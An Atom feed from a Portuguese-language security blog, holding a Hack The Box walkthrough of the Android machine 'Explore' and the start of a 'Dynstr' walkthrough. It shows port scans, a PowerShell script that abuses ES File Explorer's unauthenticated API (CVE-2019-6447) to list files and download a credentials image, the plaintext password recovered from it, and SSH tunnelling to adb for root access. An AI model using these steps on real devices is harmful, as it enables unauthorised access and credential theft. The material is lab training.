<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="pt-BR"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://davicruz.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://davicruz.com/" rel="alternate" type="text/html" hreflang="pt-BR" /><updated>2023-07-30T17:59:38-03:00</updated><id>https://davicruz.com/feed.xml</id><title type="html">Davi Cruz</title><subtitle>Just another Cybersecurity blog</subtitle><author><name>Davi Cruz</name></author><entry><title type="html">Walktrough: HTB Explore</title><link href="https://davicruz.com/walkthrough/2021/10/htb-explore" rel="alternate" type="text/html" title="Walktrough: HTB Explore" /><published>2021-10-30T13:00:00-03:00</published><updated>2021-10-30T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/10/htb-explore</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/10/htb-explore"><![CDATA[<p>Olá pessoal!</p>

<p>A máquina desta semana será <strong>Explore</strong>, uma máquina Android classificada como fácil do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/27897">bertolis</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.</p>

<p><img src="https://i.imgur.com/0cwBArJ.png" alt="HTB Explore" class="align-center" /></p>

<p>Esta foi minha primeira máquina Android do HTB e, mesmo nao tendo acesso ao ADB diretamente, consegui acesso via SSH a partir de informação obtida via um aplicativo vulnerável.</p>

<p>Espero que gostem!</p>

<h2 id="enumeração">Enumeração</h2>

<p>Como de costume, iniciado com a enumeração rápida via <code class="language-plaintext highlighter-rouge">nmap</code> para buscar as portas publicadas nesta máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.247
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-16 14:26 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.247
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT     STATE    SERVICE VERSION
2222/tcp open     ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span class="o">(</span>RSA<span class="o">)</span>
5555/tcp filtered freeciv
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/16%Time<span class="o">=</span>611A9FDB%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
SF:LL,24,<span class="s2">"SSH-2</span><span class="se">\.</span><span class="s2">0-SSH</span><span class="se">\x</span><span class="s2">20Server</span><span class="se">\x</span><span class="s2">20-</span><span class="se">\x</span><span class="s2">20Banana</span><span class="se">\x</span><span class="s2">20Studio</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.05 seconds
</code></pre></div></div>

<h3 id="5555tcp---freeciv">5555/TCP - freeciv</h3>

<p>Como esta é minha primeira máquina android, comecei por pesquisar sobre este serviço <code class="language-plaintext highlighter-rouge">freeciv</code> encontrado. Interessantemente encontrei um <a href="https://medium.com/@samsepio1/android4-vulnhub-writeup-3036f352640f">write-up para uma máquina do VulnHub</a> que menciona que esta porta é utilizada pelo ADB (Android Debug Bridge) mas, diferentemente desta, na máquina Explore ela se encontra <strong>filtrada</strong>(filtered). Vamos manter esta informação por enquanto até que encontremos um jeito de buscar um shell interativo neste dispositivo.</p>

<p>Para buscar por alguma informação faltante, executei um novo scan no <code class="language-plaintext highlighter-rouge">nmap</code>, desta vez para buscar todas as portas TCP, onde encontrei algumas portas adicionais abertas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> allPorts 10.10.10.247
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Sarting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-16 14:44 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.247
Host is up <span class="o">(</span>0.070s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65530 closed ports
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
37425/tcp open     unknown
42135/tcp open     unknown
59777/tcp open     unknown

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>41.93 seconds
<span class="nv">$ </span>nmap <span class="nt">-p37425</span>,42135,59777 <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> Full 10.10.10.247
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-16 14:47 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.247
Host is up <span class="o">(</span>0.071s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
37425/tcp open  unknown
42135/tcp open  http    ES File Explorer Name Response httpd
59777/tcp open  http    Bukkit JSONAPI httpd <span class="k">for </span>Minecraft game server 3.6.0 or older
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port37425-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/16%Time<span class="o">=</span>611AA4D5%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>G
SF:enericLines,AA,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">20
SF:16</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:48:06</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2022</span><span class="se">\r\n</span><span class="s2">Conten
SF:t-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\</span><span class="s2">
SF:r</span><span class="se">\n</span><span class="s2">Invalid</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\x</span><span class="s2">20line:</span><span class="se">\x</span><span class="s2">20"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,5C,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20412</span><span class="se">\</span><span class="s2">
SF:x20Precondition</span><span class="se">\x</span><span class="s2">20Failed</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:4
SF:8:06</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,B5,<span class="s2">"HTTP/1</span><span class="se">\</span><span class="s2">
SF:.0</span><span class="se">\x</span><span class="s2">20501</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Implemented</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">
SF:2017:48:11</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2029</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/pla
SF:in;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Method</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">2
SF:0supported:</span><span class="se">\x</span><span class="s2">20OPTIONS"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,BB,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20R
SF:equest</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:48:11</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Cont
SF:ent-Length:</span><span class="se">\x</span><span class="s2">2039</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r</span><span class="s2">
SF:</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Not</span><span class="se">\x</span><span class="s2">20a</span><span class="se">\x</span><span class="s2">20valid</span><span class="se">\x</span><span class="s2">20protocol</span><span class="se">\x</span><span class="s2">20version:
SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20RTSP/1</span><span class="se">\.</span><span class="s2">0"</span><span class="o">)</span>%r<span class="o">(</span>Help,AE,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Da
SF:te:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:48:26</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\</span><span class="s2">
SF:x2026</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection
SF::</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Invalid</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\x</span><span class="s2">20line:</span><span class="se">\x</span><span class="s2">20HELP"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq
SF:,DD,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">
SF:202021</span><span class="se">\x</span><span class="s2">2017:48:26</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2073</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20
SF:text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Invalid</span><span class="se">\</span><span class="s2">
SF:x20request</span><span class="se">\x</span><span class="s2">20line:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">03</span><span class="se">\0\0</span><span class="s2">S</span><span class="se">\x</span><span class="s2">01</span><span class="se">\0\0</span><span class="s2">O</span><span class="se">\x</span><span class="s2">03</span><span class="se">\0\?</span><span class="s2">G</span><span class="se">\?\?\?</span><span class="s2">,</span><span class="se">\?\?\?</span><span class="sb">`</span>~<span class="se">\?</span>
SF:<span class="se">\0\?\?</span><span class="o">{</span><span class="se">\?\?\?\?</span>w<span class="se">\?\?\?\?</span>&lt;<span class="o">=</span><span class="se">\?</span>o<span class="se">\?\x</span>10n<span class="se">\0\0\(\0\x</span>16<span class="se">\0\x</span>13<span class="se">\0</span><span class="s2">")%r(TerminalSe
SF:rverCookie,CA,"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20400<span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>Date:<span class="se">\x</span>20Mon,<span class="se">\x</span>201
SF:6<span class="se">\x</span>20Aug<span class="se">\x</span>202021<span class="se">\x</span>2017:48:26<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>2054<span class="se">\r\n</span>Content
SF:-Type:<span class="se">\x</span>20text/plain<span class="p">;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>US-ASCII<span class="se">\r\n</span>Connection:<span class="se">\x</span>20Close<span class="se">\r\n\r</span>
SF:<span class="se">\n</span>Invalid<span class="se">\x</span>20request<span class="se">\x</span>20line:<span class="se">\x</span>20<span class="se">\x</span>03<span class="se">\0\0\*</span>%<span class="se">\?\0\0\0\0\0</span>Cookie:<span class="se">\x</span>20msts
SF:hash<span class="o">=</span>nmap<span class="s2">")%r(TLSSessionReq,DB,"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20400<span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>D
SF:ate:<span class="se">\x</span>20Mon,<span class="se">\x</span>2016<span class="se">\x</span>20Aug<span class="se">\x</span>202021<span class="se">\x</span>2017:48:26<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Length:
SF:<span class="se">\x</span>2071<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/plain<span class="p">;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>US-ASCII<span class="se">\r\n</span>Connectio
SF:n:<span class="se">\x</span>20Close<span class="se">\r\n\r\n</span>Invalid<span class="se">\x</span>20request<span class="se">\x</span>20line:<span class="se">\x</span>20<span class="se">\x</span>16<span class="se">\x</span>03<span class="se">\0\0</span>i<span class="se">\x</span>01<span class="se">\0\0</span>
SF:e<span class="se">\x</span>03<span class="se">\x</span>03U<span class="se">\x</span>1c<span class="se">\?\?</span>random1random2random3random4<span class="se">\0\0\x</span>0c<span class="se">\0</span>/<span class="se">\0</span><span class="s2">");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.01 seconds
</span></code></pre></div></div>

<h3 id="42135tcp---es-file-explorer-name-response-httpd">42135/TCP - ES File Explorer Name Response httpd</h3>

<p>Buscando por este serviço no <code class="language-plaintext highlighter-rouge">searchsploit</code> encontrei um resultado para a plataforma Android.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit ES File Explorer
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                        |  Path
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
ES File Explorer 4.1.9.7.4 - Arbitrary File Read                      | android/remote/50070.py
iOS iFileExplorer Free - Directory Traversal                          | ios/remote/16278.py
MetaProducts Offline Explorer 1.x - FileSystem Disclosure             | windows/remote/20488.txt
Microsoft Internet Explorer / MSN - ICC Profiles Crash <span class="o">(</span>PoC<span class="o">)</span>          | windows/dos/1110.txt
Microsoft Internet Explorer 4.x/5 / Outlook 2000 0/98 0/Express 4.x - | windows/remote/19603.txt
Microsoft Internet Explorer 4/5 - DHTML Edit ActiveX Control File Ste | windows/remote/19094.txt
Microsoft Internet Explorer 5 - ActiveX Object For Constructing Type  | windows/remote/19468.txt
Microsoft Internet Explorer 5 / Firefox 0.8 / OmniWeb 4.x - URI Proto | windows/remote/24116.txt
Microsoft Internet Explorer 5/6 - <span class="s1">'file://'</span> Request Zone Bypass       | windows/remote/22575.txt
Microsoft Internet Explorer 6 - <span class="s1">'%USERPROFILE%'</span> File Execution        | windows/remote/22734.html
Microsoft Internet Explorer 6 - Local File Access                     | windows/remote/29619.html
Microsoft Internet Explorer 7 - Arbitrary File Rewrite <span class="o">(</span>MS07-027<span class="o">)</span>     | windows/remote/3892.html
My File Explorer 1.3.1 iOS - Multiple Web Vulnerabilities             | ios/webapps/28975.txt
WebFileExplorer 3.6 - <span class="s1">'user'</span> / <span class="s1">'pass'</span> SQL Injection                   | php/webapps/35851.txt
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
</code></pre></div></div>

<h2 id="acesso-inicial-e-user-flag">Acesso inicial e User flag</h2>

<p>Verificando este exploit, notei que está relacionado ao <strong>CVE-2019-6447</strong>, discutido neste post <strong><a href="https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566">Analysis of ES File Explorer Security Vulnerability (CVE-2019–6447) | by Knownsec 404 team | Medium</a></strong>.</p>

<p>Esta vulnerabilidade consiste em uma falha que permite a execução de alguns comandos (implementados pelo app) de forma não autenticada, sem a necessidade de quaisquer tipos de autorização. Já que é bem simples, criei um script Powershell para enumerar as informações disponíveis:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/pwsh</span><span class="w">

</span><span class="nv">$methods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'listFiles'</span><span class="p">,</span><span class="s1">'listPics'</span><span class="p">,</span><span class="s1">'listVideos'</span><span class="p">,</span><span class="s1">'listAudios'</span><span class="p">,</span><span class="s1">'listAppsAll'</span><span class="p">,</span><span class="s1">'getDeviceInfo'</span><span class="p">)</span><span class="w">

</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$method</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$methods</span><span class="p">){</span><span class="w">
    </span><span class="n">Write-host</span><span class="w"> </span><span class="s2">"&gt;&gt;&gt; Method: </span><span class="nv">$method</span><span class="s2">"</span><span class="w"> </span><span class="nt">-foregroundcolor</span><span class="w"> </span><span class="nx">green</span><span class="w">
    </span><span class="n">Invoke-RestMethod</span><span class="w"> </span><span class="nt">-method</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nt">-header</span><span class="w"> </span><span class="p">@{</span><span class="s2">"Content-Type"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"application/json"</span><span class="p">}</span><span class="w"> </span><span class="nt">-body</span><span class="w"> </span><span class="s2">"{'command':'</span><span class="nv">$method</span><span class="s2">'}"</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://10.10.10.247:59777</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Do resultado obtido da execução do bloco anterior, o mais interessante foi uma imagem chamada <code class="language-plaintext highlighter-rouge">creds.jpg</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; Method: listPics

name     : concept.jpg
time     : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size     : 135.33 KB (138,573 Bytes)

name     : anc.png
time     : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size     : 6.24 KB (6,392 Bytes)

name     : creds.jpg
time     : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size     : 1.14 MB (1,200,401 Bytes)

name     : 224_anc.png
time     : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size     : 124.88 KB (127,876 Bytes)
</code></pre></div></div>

<p>Para baixar o arquivo, utilizei o comando abaixo, também permitido pela vulnerabilidade do app encontrado:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg <span class="nt">-o</span> creds.jpg
</code></pre></div></div>

<p>Abrindo a imagem em um visualizador, notei que existiam algumas credenciais na mesma: <strong>kristi:Kr1sT!5h@Rp3xPl0r3!</strong></p>

<p><img src="https://i.imgur.com/senu2Y7.png" alt="HTB Explore - creds.jpg" class="align-center" /></p>

<p>Estas credenciais permitiram que me conectasse via SSH na porta 2222/TCP, conforme previamente enumerado. Encontrei a flag de usuário ao acessar o arquivo <code class="language-plaintext highlighter-rouge">/sdcard/user.txt</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh kristi@10.10.10.247 <span class="nt">-p</span> 2222
Password authentication
Password:
:/ <span class="nv">$ </span><span class="nb">cd</span> /sdcard/
:/sdcard <span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>Agora que temos acesso via SSH nesta máquina, podemos obter acesso root utilizando o ADB shell a partir do redirecionamento da porta do serviço utilizando o SSH, onde redirecionei a porta 5555/TCP da máquina para um listener local, vide comando abaixo a ser executado na máquina do atacante:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh kristi@10.10.10.247 <span class="nt">-p</span> 2222 <span class="nt">-L</span> 5555:127.0.0.1:5555
Password authentication
Password:
:/ <span class="err">$</span>
</code></pre></div></div>

<p>Após conexão, apenas precisei me conectar utilizando o <code class="language-plaintext highlighter-rouge">adb</code> apontando o endereço para a porta local, que está sendo tunelado pela conexão SSH, onde, para obter privilégios de root, apenas precisei executar o comando <code class="language-plaintext highlighter-rouge">su</code> para obter acesso como <code class="language-plaintext highlighter-rouge">root</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>adb connect 127.0.0.1:5555
connected to 127.0.0.1:5555
<span class="nv">$ </span>adb shell
x86_64:/ <span class="nv">$ </span>su
:/ <span class="c"># find / -type f 2&gt; /dev/null | grep root.txt</span>
/data/root.txt
:/ <span class="c"># cat /data/root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo vocês no próximo post :smiley:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Easy" /><category term="HTB Android" /><summary type="html"><![CDATA[Olá pessoal! A máquina desta semana será Explore, uma máquina Android classificada como fácil do Hack The Box, criada por bertolis.]]></summary></entry><entry><title type="html">Walktrough: HTB Dynstr</title><link href="https://davicruz.com/walkthrough/2021/10/htb-dynstr" rel="alternate" type="text/html" title="Walktrough: HTB Dynstr" /><published>2021-10-16T13:00:00-03:00</published><updated>2021-10-16T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/10/htb-dynstr</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/10/htb-dynstr"><![CDATA[<p>Olá pessoal!</p>

<p>A máquina desta semana será <strong>Dynstr</strong>, outra máquina Linux classificada como mediana do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/77141">jkr</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.</p>

<p><img src="https://i.imgur.com/kqW8fwk.png" alt="HTB Dynstr" class="align-center" /></p>

<p>Tive a oportunidade de aprender muito com esta máquina! Primeiro enquanto brincava com alguns dicionários de code injection e depois para entender o funcionamento do utilitário <code class="language-plaintext highlighter-rouge">nsupdate</code>. Após obter execução de código e um shell reverso, encontrei uma chave privada RSA a ser utilizada em uma conexão SSH porém precisei contornar algumas restrições presentes no arquivo <code class="language-plaintext highlighter-rouge">authorized_keys</code> e, a partir desta outra conta, pude obter a credencial de <code class="language-plaintext highlighter-rouge">root</code> utilizando de globbing durante a escalação de privilégio.</p>

<p>Espero que gostem!</p>

<h2 id="enumeração">Enumeração</h2>

<p>Como de costume, iniciei a enumeração dos serviços publicados utilizando um scan rápido do <code class="language-plaintext highlighter-rouge">nmap</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.244
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-11 18:32 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.244
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e <span class="o">(</span>RSA<span class="o">)</span>
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Dyna DNS
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>17.02 seconds
</code></pre></div></div>

<p>Validando o scan inicial, podemos ver um serviço de DNS, assim como um website HTTP publicado. Antes de adentrar na enumeração do DNS, vamos validar que tipo de informação este website pode nos prover.</p>

<h3 id="80tcp---serviço-ttp">80/TCP - Serviço TTP</h3>

<p>Acessando o website, como mencionado no título da página, temos a Dyna DNS company, uma empresa similar ao <a href="https://no-ip.com">No-IP</a> que permite o registro de entradas em DNS público e sua atualização, simplificando o processo quando não se tem um endereço IP público estático.</p>

<p><img src="https://i.imgur.com/gtdmYDI.jpg" alt="HTB Dynstr - Dyna DNS" class="align-center" /></p>

<p>Embora seja um website que consiste apenas em um single page application, este site foi especialmente útil por conter informações muito interessantes na seção <em>Our Services</em>, que foram imprescindíveis durante a resolução desta máquina, além do domínio <code class="language-plaintext highlighter-rouge">dynadns.htb</code>, utilizado como endereço de e-mail no contato presente no rodapé:</p>

<p><img src="https://i.imgur.com/QZvDDXJ.png" alt="HTB Dynstr - Dyna DNS Services" class="align-center" /></p>

<ul>
  <li>Provê uma aplicação para registro de DNS que utiliza da mesma API que <code class="language-plaintext highlighter-rouge">no-ip.com</code>, conforme disponível na documentação pública em <a href="https://www.noip.com/integrate/request">Integrate with No-IP DDNS - API Information (noip.com)</a>.</li>
  <li>Os domínios possíveis de se utilizar com o serviço encontram-se listados, os quais foram incluídos no arquivo hosts local.</li>
  <li>Credenciais para demonstrações foram fornecidas, então podemos começar a brincar com esta API :smile:</li>
</ul>

<h4 id="interagindo-com-a-api">Interagindo com a API</h4>

